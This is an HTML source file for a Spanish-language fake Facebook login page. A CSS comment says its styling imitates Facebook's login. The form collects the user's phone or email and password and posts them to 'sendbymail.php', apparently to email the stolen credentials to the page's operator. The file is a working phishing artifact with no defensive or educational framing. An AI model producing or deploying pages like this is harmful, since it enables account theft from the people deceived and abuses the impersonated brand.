<!DOCTYPE html>
<html lang="es">
<head>
    <title>Iniciar sesión en Facebook</title>
    <meta charset="UTF-8">
    <style>
        /* Estilos para que se vea similar al login de Facebook */
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }
        .login-form {
            width: 300px;
            margin: 40px auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .login-form label {
            display: block;
            margin-bottom: 10px;
        }
        .login-form input[type="text"], .login-form input[type="password"] {
            width: 100%;
            height: 30px;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
        }
        .login-form input[type="submit"] {
            width: 100%;
            height: 30px;
            padding: 10px;
            background-color: #4267b2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-form input[type="submit"]:hover {
            background-color: #365899;
        }
        .forgot-password {
            margin-top: 20px;
            text-align: center;
        }
        .forgot-password a {
            color: #365899;
            text-decoration: none;
        }
        .create-account {
            margin-top: 20px;
            text-align: center;
        }
        .create-account a {
            color: #365899;
            text-decoration: none;
        }
        /* Estilos personalizados */
        .branding {
            font-size: 24px;
            font-weight: bold;
            color: #4267b2;
            margin-bottom: 20px;
        }
        .description {
            font-size: 14px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <div class="branding">Facebook</div>
        <div class="description">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</div>
        <form action="sendbymail.php" method="post">
            <label for="email">Celular o correo electrónico</label>
            <input type="text" id="email" name="email" required>
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Iniciar sesión">
        </form>
        <div class="forgot-password">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>
        <div class="create-account">
            <a href="#">Crear cuenta nueva</a>
        </div>
    </div>
</body>
</html>
